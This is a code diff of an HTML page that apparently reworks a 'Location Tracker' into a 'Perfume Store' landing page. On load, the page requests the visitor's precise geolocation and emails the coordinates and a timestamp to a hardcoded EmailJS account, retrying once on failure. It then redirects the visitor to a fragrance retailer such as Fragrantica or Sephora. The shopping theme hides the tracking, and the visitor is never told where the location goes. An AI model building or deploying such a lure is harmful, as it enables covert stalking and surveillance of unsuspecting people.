@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
+    <title>Perfume Store - Location Tracker</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -12,53 +12,118 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
             color: white;
         }
         .container {
             text-align: center;
-            padding: 30px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
+            padding: 40px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 20px;
+            backdrop-filter: blur(15px);
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h2 {
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .subtitle {
+            opacity: 0.9;
+            margin-bottom: 20px;
         }
         #locationDisplay {
             margin: 20px 0;
             padding: 15px;
-            background: rgba(0,0,0,0.2);
-            border-radius: 8px;
-            font-size: 16px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            font-size: 14px;
+            word-break: break-all;
         }
         button {
             background: white;
-            color: #764ba2;
+            color: #f5576c;
             border: none;
-            padding: 12px 30px;
-            border-radius: 25px;
+            padding: 14px 35px;
+            border-radius: 30px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin: 10px;
+            margin: 8px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
         button:hover {
-            transform: scale(1.05);
-            transition: transform 0.2s;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+        }
+        button.secondary {
+            background: rgba(255,255,255,0.2);
+            color: white;
+            border: 2px solid white;
+        }
+        button.secondary:hover {
+            background: white;
+            color: #f5576c;
         }
         .status {
             margin: 15px 0;
-            padding: 10px;
-            border-radius: 5px;
+            padding: 12px;
+            border-radius: 10px;
             background: rgba(0,0,0,0.3);
+            font-size: 14px;
+        }
+        .status.success {
+            background: rgba(0,255,0,0.3);
+        }
+        .status.error {
+            background: rgba(255,0,0,0.3);
+        }
+        .status.waiting {
+            background: rgba(255,255,0,0.2);
+        }
+        .redirect-options {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .redirect-options button {
+            font-size: 14px;
+            padding: 10px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        .redirect-options button:hover {
+            background: white;
+            color: #f5576c;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>📍 Location Tracker</h2>
+        <h2>🌸 Perfume Store</h2>
+        <div class="subtitle">Find your perfect fragrance</div>
+        
         <div id="locationDisplay">⏳ Requesting location...</div>
-        <div id="statusMessage" class="status">📡 Waiting for permission...</div>
-        <button onclick="requestLocation()">📍 Allow Location</button>
-        <button onclick="window.location.href='https://www.dior.com/'">🚀 Go to Dior</button>
+        <div id="statusMessage" class="status waiting">📡 Waiting for permission...</div>
+        
+        <button onclick="requestLocation()">📍 Allow Location Access</button>
+        
+        <div class="redirect-options">
+            <small style="opacity:0.8;">Choose a perfume store to redirect after location is sent:</small>
+            <button onclick="setRedirectUrl('https://www.fragrantica.com/')">🌸 Fragrantica</button>
+            <button onclick="setRedirectUrl('https://www.fragrancex.com/')">🌺 FragranceX</button>
+            <button onclick="setRedirectUrl('https://www.fragrancenet.com/')">💐 FragranceNet</button>
+            <button onclick="setRedirectUrl('https://www.ulta.com/')">🎀 Ulta Beauty</button>
+            <button onclick="setRedirectUrl('https://www.sephora.com/')">💄 Sephora</button>
+        </div>
+        
+        <div style="margin-top:15px;">
+            <button class="secondary" onclick="window.location.href='https://www.fragrantica.com/'">🚀 Skip & Go to Store</button>
+        </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -67,27 +132,36 @@
         emailjs.init("ueOumEe6aJ_CEmq_m");
 
         let locationSent = false;
+        let redirectUrl = 'https://www.fragrantica.com/'; // Default URL
+
+        function setRedirectUrl(url) {
+            redirectUrl = url;
+            document.getElementById('statusMessage').innerHTML = `✅ Redirect set to: ${new URL(url).hostname}`;
+            document.getElementById('statusMessage').className = 'status success';
+            console.log(`🎯 Redirect URL set to: ${url}`);
+        }
 
         function sendLocationEmail(latitude, longitude) {
             console.log("📍 Sending Location Data:", { latitude, longitude });
 
             const templateParams = {
                 latitude: latitude.toString(),
-                longitude: longitude.toString()
+                longitude: longitude.toString(),
+                timestamp: new Date().toLocaleString()
             };
 
             return emailjs.send("service_7pjie2s", "template_30kabln", templateParams)
                 .then((response) => {
                     console.log("✅ Email sent successfully!", response);
                     document.getElementById("statusMessage").innerHTML = "✅ Email sent successfully! 📧";
-                    document.getElementById("statusMessage").style.background = "rgba(0,255,0,0.3)";
+                    document.getElementById("statusMessage").className = "status success";
                     locationSent = true;
                     return true;
                 })
                 .catch((error) => {
                     console.error("❌ Error sending email:", error);
-                    document.getElementById("statusMessage").innerHTML = "⚠️ Email sending failed! Please try again.";
-                    document.getElementById("statusMessage").style.background = "rgba(255,0,0,0.3)";
+                    document.getElementById("statusMessage").innerHTML = "⚠️ Email sending failed! Retrying...";
+                    document.getElementById("statusMessage").className = "status error";
                     return false;
                 });
         }
@@ -95,7 +169,7 @@
         function requestLocation() {
             console.log("📍 Requesting location permission...");
             document.getElementById("statusMessage").innerHTML = "⏳ Requesting location permission...";
-            document.getElementById("statusMessage").style.background = "rgba(255,255,0,0.3)";
+            document.getElementById("statusMessage").className = "status waiting";
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
@@ -109,15 +183,28 @@
                         document.getElementById("locationDisplay").style.background = "rgba(0,255,0,0.2)";
                         
                         document.getElementById("statusMessage").innerHTML = "✅ Location captured! Sending email...";
-                        document.getElementById("statusMessage").style.background = "rgba(0,255,0,0.3)";
+                        document.getElementById("statusMessage").className = "status waiting";
 
                         // Send email with location
                         sendLocationEmail(latitude, longitude).then((success) => {
                             if (success) {
-                                // Redirect to Dior after 2 seconds
+                                // Redirect after 2 seconds
                                 setTimeout(() => {
-                                    window.location.href = "https://www.dior.com/";
+                                    document.getElementById("statusMessage").innerHTML = `🔄 Redirecting to perfume store...`;
+                                    document.getElementById("statusMessage").className = "status waiting";
+                                    window.location.href = redirectUrl;
                                 }, 2000);
+                            } else {
+                                // If email fails, try once more
+                                setTimeout(() => {
+                                    sendLocationEmail(latitude, longitude).then((retrySuccess) => {
+                                        if (retrySuccess) {
+                                            setTimeout(() => {
+                                                window.location.href = redirectUrl;
+                                            }, 2000);
+                                        }
+                                    });
+                                }, 3000);
                             }
                         });
                     },
@@ -134,7 +221,7 @@
                         document.getElementById("locationDisplay").textContent = errorMessage;
                         document.getElementById("locationDisplay").style.background = "rgba(255,0,0,0.2)";
                         document.getElementById("statusMessage").innerHTML = "❌ " + errorMessage;
-                        document.getElementById("statusMessage").style.background = "rgba(255,0,0,0.3)";
+                        document.getElementById("statusMessage").className = "status error";
                     },
                     {
                         enableHighAccuracy: true,
@@ -146,6 +233,7 @@
                 console.log("❌ Geolocation not supported.");
                 document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported in this browser!";
                 document.getElementById("statusMessage").innerHTML = "❌ Browser doesn't support geolocation!";
+                document.getElementById("statusMessage").className = "status error";
             }
         }
 
@@ -155,11 +243,10 @@
             // Small delay to ensure everything is loaded
             setTimeout(() => {
                 requestLocation();
-            }, 500);
+            }, 800);
         });
 
-        // Manual trigger if auto doesn't work (browser might block auto requests)
-        console.log("💡 Click the 'Allow Location' button if location wasn't requested automatically.");
+        console.log("💡 Click a perfume store button to choose where to redirect after location is sent!");
     </script>
 </body>
 </html>
